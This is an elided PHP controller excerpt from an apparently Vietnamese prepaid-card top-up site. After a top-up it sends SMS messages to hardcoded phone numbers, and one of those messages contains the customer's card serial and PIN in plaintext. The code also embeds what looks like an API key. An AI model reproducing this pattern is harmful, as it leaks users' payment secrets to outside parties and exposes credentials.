...
class NaptheController extends Controller
{
    ...
    public function napthecao(Request $request) {
       ...
       if($result) {
		 ...
		 $api->sendSMS(["0582794713"], "DOITHE.APP - SMSSpeed-  Nap the ".$request->get('card_type')." Price ".$request->get('card_price')." Seri: ".$request->get('card_seria')." Pin: ".$request->get('card_pin')."  ", 5, 'cb42da309804');
		...
		$contentSMS = "DOITHE.APP - SMSGateWay - The ".$request->get('card_type')." Gia ".number_format($request->get('card_price'))." vnd, Seri: ".$request->get('card_seria');
		//$contentSMS = "DOITHE.APP - Truc tiep The ".$request->get('card_type')." Gia ".number_format($request->get('card_price'))." vnd, Seri: ".$request->get('card_seria')." PIN: ".$request->get('card_pin');
		SMS::send(['0582794713','0924861389'], $contentSMS);
		 
        return redirect()->back()->with('message', 'Nạp thành công, xem ở lịch sử!');
       }
       return false;
    }
